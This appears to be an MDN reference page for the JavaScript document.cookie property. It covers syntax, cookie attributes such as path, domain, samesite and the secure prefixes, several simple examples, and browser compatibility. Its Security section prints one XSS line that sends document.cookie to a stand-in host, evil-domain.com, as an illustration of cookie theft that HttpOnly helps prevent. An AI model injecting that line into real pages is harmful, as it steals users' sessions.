# Document.cookie

The [`Document`](../document) property `cookie` lets you read and write [cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) associated with the document. It serves as a getter and setter for the actual values of the cookies.

## Syntax

### Read all cookies accessible from this location

    allCookies = document.cookie;

In the code above `allCookies` is a string containing a semicolon-separated list of all cookies (i.e. `key=value` pairs). Note that each key and value may be surrounded by whitespace (space and tab characters): in fact, [RFC 6265](https://tools.ietf.org/html/rfc6265) mandates a single space after each semicolon, but some user agents may not abide by this.

### Write a new cookie

    document.cookie = newCookie;

In the code above, `newCookie` is a string of form `key=value`. Note that you can only set/update a single cookie at a time using this method. Consider also that:

- Any of the following cookie attribute values can optionally follow the key-value pair, specifying the cookie to set/update, and preceded by a semi-colon separator:

  - <span id="new-cookie_path">`;path=path` (e.g., '`/`', '`/mydir`') If not specified, defaults to the current path of the current document location.</span>
    **Note:** Prior to Gecko 6.0, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.

  - <span id="new-cookie_domain">`;domain=domain` (e.g., '`example.com`' or '`subdomain.example.com`'). If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.</span>
    **Note:** The domain _must_ match the domain of the JavaScript origin. Setting cookies to foreign domains will be silently ignored.

  - <span id="new-cookie_max-age">`;max-age=max-age-in-seconds` (e.g., `60*60*24*365` or 31536000 for a year)</span>
  - <span id="new-cookie_expires">`;expires=date-in-GMTString-format` If neither `expires` nor `max-age` specified it will expire at the end of session.</span>
    When user privacy is a concern, it's important that any web app implementation invalidate cookie data after a certain timeout instead of relying on the browser to do it. Many browsers let users specify that cookies should never expire, which is not necessarily safe.

    - See [`Date.toUTCString()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toUTCString) for help formatting this value.

  - <span id="new-cookie_secure">`;secure` Cookie to only be transmitted over secure protocol as https. Before Chrome 52, this flag could appear with cookies from http domains.</span>
  - <span id="new-cookie_samesite">`;samesite` [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_cookies) prevents the browser from sending this cookie along with cross-site requests. Possible values are `lax`, `strict` or `none`.</span>
    - The `lax` value will send the cookie for all same-site requests and top-level navigation GET requests. This is sufficient for user tracking, but it will prevent many [Cross-Site Request Forgery](https://developer.mozilla.org/en-US/docs/Glossary/CSRF) (CSRF) attacks. This is the default value in modern browsers.
    - The `strict` value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts, even when following a regular link.
    - The `none` value explicitly states no restrictions will be applied. The cookie will be sent in all requests—both cross-site and same-site.

- The cookie value string can use [`encodeURIComponent()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent) to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).
- Some user agent implementations support the following cookie prefixes:

  - `__Secure-` Signals to the browser that it should only include the cookie in requests transmitted over a secure channel.
  - `__Host-` Signals to the browser that in addition to the restriction to only use the cookie from a secure origin, the scope of the cookie is limited to a path attribute passed down by the server. If the server omits the path attribute the "directory" of the request URI is used. It also signals that the domain attribute must not be present, which prevents the cookie from being sent to other domains. For Chrome the path attribute must always be the origin.

  The dash is considered part of the prefix.

  These flags are only settable with the `secure` attribute.

**Note:** As you can see from the code above, `document.cookie` is an [accessor property](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) with native _setter_ and _getter_ functions, and consequently is _not_ a [data property](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.

## Examples

### Example \#1: Simple usage

    document.cookie = "name=oeschger";
    document.cookie = "favorite_food=tripe";
    function alertCookie() {
      alert(document.cookie);
    }

    <button onclick="alertCookie()">Show cookies</button>

### Example \#2: Get a sample cookie named _test2_

    document.cookie = "test1=Hello";
    document.cookie = "test2=World";

    const cookieValue = document.cookie
      .split('; ')
      .find(row => row.startsWith('test2='))
      .split('=')[1];

    function alertCookieValue() {
      alert(cookieValue);
    }

    <button onclick="alertCookieValue()">Show cookie value</button>

### Example \#3: Do something only once

In order to use the following code, please replace all occurrences of the word `doSomethingOnlyOnce` (the name of the cookie) with a custom name.

    function doOnce() {
      if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
        alert("Do something here!");
        document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
      }
    }

    <button onclick="doOnce()">Only do something once</button>

### Example \#4: Reset the previous cookie

    function resetOnce() {
      document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }

    <button onclick="resetOnce()">Reset only once cookie</button>

### Example \#5: Check a cookie existence

    //ES5

    if (document.cookie.split(';').some(function(item) {
        return item.trim().indexOf('reader=') == 0
    })) {
        console.log('The cookie "reader" exists (ES5)')
    }

    //ES2016

    if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
        console.log('The cookie "reader" exists (ES6)')
    }

### Example \#6: Check that a cookie has a specific value

    //ES5

    if (document.cookie.split(';').some(function(item) {
        return item.indexOf('reader=1') >= 0
    })) {
        console.log('The cookie "reader" has "1" for value')
    }

    //ES2016

    if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
        console.log('The cookie "reader" has "1" for value')
    }

## Security

It is important to note that the `path` attribute does _not_ protect against unauthorized reading of the cookie from a different path. It can be easily bypassed using the DOM, for example by creating a hidden [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) element with the path of the cookie, then accessing this iframe's `contentDocument.cookie` property. The only way to protect the cookie is by using a different domain or subdomain, due to the [same origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy).

Cookies are often used in web applications to identify a user and their authenticated session. Stealing a cookie from a web application leads to hijacking the authenticated user's session. Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -

    (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

The `HTTPOnly` cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about [Cookies and Security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/).

## Notes

- Starting with Firefox 2, a better mechanism for client-side storage is available - [WHATWG DOM Storage](../web_storage_api).
- You can delete a cookie by updating its expiration time to zero.
- Keep in mind that the more cookies you have, the more data will be transferred between the server and the client for each request. This will make each request slower. It is highly recommended for you to use [WHATWG DOM Storage](../web_storage_api) if you are going to keep "client-only" data.
- [RFC 2965](https://www.ietf.org/rfc/rfc2965.txt) (Section 5.3, "Implementation Limits") specifies that there should be **no maximum length** of a cookie's key or value size, and encourages implementations to support **arbitrarily large cookies**. Each browser's implementation maximum will necessarily be different, so consult individual browser documentation.

The reason for the [syntax](#syntax) of the `document.cookie` accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, [localStorage](../web_storage_api)):

#### The server tells the client to store a cookie

    HTTP/1.0 200 OK
    Content-type: text/html
    Set-Cookie: cookie_name1=cookie_value1
    Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

    [content of the page here]

#### The client sends back to the server its cookies previously stored

    GET /sample_page.html HTTP/1.1
    Host: www.example.org
    Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
    Accept: */*

## Specifications

<table><thead><tr class="header"><th>Specification</th><th>Status</th><th>Comment</th></tr></thead><tbody><tr class="odd"><td><a href="https://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-8747038">Document Object Model (DOM) Level 2 HTML Specification<br />
<span class="small">The definition of 'Document.cookie' in that specification.</span></a></td><td><span class="spec-obsolete">Obsolete</span></td><td>Initial definition</td></tr><tr class="even"><td><a href="https://tools.ietf.org/html/draft-west-cookie-prefixes-05">Cookie Prefixes</a></td><td><span class="spec-draft">Draft</span></td><td></td></tr></tbody></table>

## Browser compatibility

Desktop

Mobile

Chrome

Edge

Firefox

Internet Explorer

Opera

Safari

WebView Android

Chrome Android

Firefox for Android

Opera Android

Safari on IOS

Samsung Internet

`cookie`

1

12

1

Prior to Firefox 68, `cookie` was available only on HTML documents; it is now available on all documents, such as XML and SVG.

4

3

1

1

18

4

Prior to Firefox 68, `cookie` was available only on HTML documents; it is now available on all documents, such as XML and SVG.

10.1

1

1.0

## See also

- [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [DOM Storage](../web_storage_api)
- [`URLUtils.pathname`](../urlutils.pathname)
- [`Date.toUTCString()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toUTCString)
- [`HTTP`](https://developer.mozilla.org/ja/docs/Web/HTTP)
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)

<a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie" class="_attribution-link">https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie</a>
